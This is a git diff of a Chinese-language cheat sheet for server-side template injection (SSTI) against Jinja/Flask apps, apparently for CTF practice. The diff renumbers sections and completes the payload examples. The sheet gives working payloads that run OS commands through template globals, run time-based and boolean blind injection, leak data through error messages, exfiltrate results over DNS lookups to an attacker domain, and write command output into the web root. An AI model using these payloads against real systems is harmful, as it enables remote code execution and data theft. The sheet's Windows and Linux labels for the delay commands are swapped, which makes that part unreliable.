@@ -1,6 +1,10 @@
-# ssti模板绕过
+# ssti模板绕过和盲注
 
-## 1.时间盲注
+##匹配绕过
+
+
+
+## 2.时间盲注
 
 ```
 {%if 条件%}{{`__import__`('time').sleep(3)}}{%if%}
@@ -10,7 +14,7 @@
 windos sleep 3
 linux ping -n 4 127.0.0.1
 
-##2.布尔盲注
+##3.布尔盲注
 页面会根据结果返回固定的页面时使用
 ```
 {%if 条件%}回显不同页面需要的值{% endif %}
@@ -25,10 +29,10 @@ linux ping -n 4 127.0.0.1
     
     {%if 条件%}admin{% endif %}	判断语句
 
-##3.报错注入
+##4.报错注入
 
 通过报错日志把数据带出来显示(根据引擎决定能不能带上)
-###3.1类型转换错误
+###4.1类型转换错误
 ```
 {{__import__('os').popen('id').read()|int}}
 {{lipsum.__globals__.__builtins__.int(数据源)}}
@@ -40,7 +44,7 @@ TypeError: can only concatenate str (not "int") to str
 
 
 ```
-###3.2访问不存在属性和索引
+###4.2访问不存在属性和索引
 
 ```
 {{ [__import__('os').popen('id').read()][999] }}
@@ -59,8 +63,8 @@ Template context:
 FileNotFoundError: [Errno 2] No such file or directory: 'flag{xxx}'
 ```
 
-###4.外带注入
-###4.1dns外带
+###5.外带注入
+###5.1dns外带
 
 ```
 jinja自带
@@ -68,11 +72,13 @@ jinja自带
 python原生
 {{ lipsum.__globals__.__builtins__.__import__('socket').gethostbyname('数据.你的域名') }}
 ```
-###4.2文件外带注入
+###5.2文件外带注入
 ####入口1：web根目录
 ####入口2：静态资源类可读目录
 ####入口3：日志文件
 ####入口4：临时目录+其他漏洞
 
+```
 {{ url_for.__globals__.__builtins__['open']('/var/www/html/out.txt','w').write(数据)}}
-{{url_for.__globals__.}}
+{{url_for.__globals__['os'].popen('echo 数据 > /var/www/html/out.txt').read()}}
+```
